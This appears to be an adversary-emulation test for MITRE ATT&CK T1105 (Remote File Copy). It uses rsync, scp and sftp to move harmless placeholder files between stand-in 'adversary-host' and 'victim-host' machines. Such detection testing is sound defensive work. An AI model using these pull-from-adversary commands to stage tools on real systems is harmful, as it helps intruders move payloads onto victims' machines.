# Remote File Copy

MITRE ATT&CK Technique: [T1105](https://attack.mitre.org/wiki/Technique/T1105)

## Adversary System Configuration
### Ensure SSH access has been configured for an adversary account
    echo "This file transferred by scp" > /tmp/adversary-scp
    echo "This file transferred by sftp" > /tmp/adversary-sftp
    mkdir /tmp/adversary-rsync
    cd /tmp/adversary-rsync
    touch a b c d e f g

## Victim System Configuration
### Ensure SSH access has been configured for a victim account
### Ensure write access for victim account to this directory
    mkdir /tmp/victim-files
    cd /tmp/victim-files

## Push files to victim using rsync
    rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files/

## Pull files from adversary using rsync
    rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files/

## Push files to victim using scp
    scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/

## Pull file from adversary using scp
    scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/scp-file

## Push files to victim using sftp
    sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'

## Pull file from adversary using sftp
    sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/sftp-file
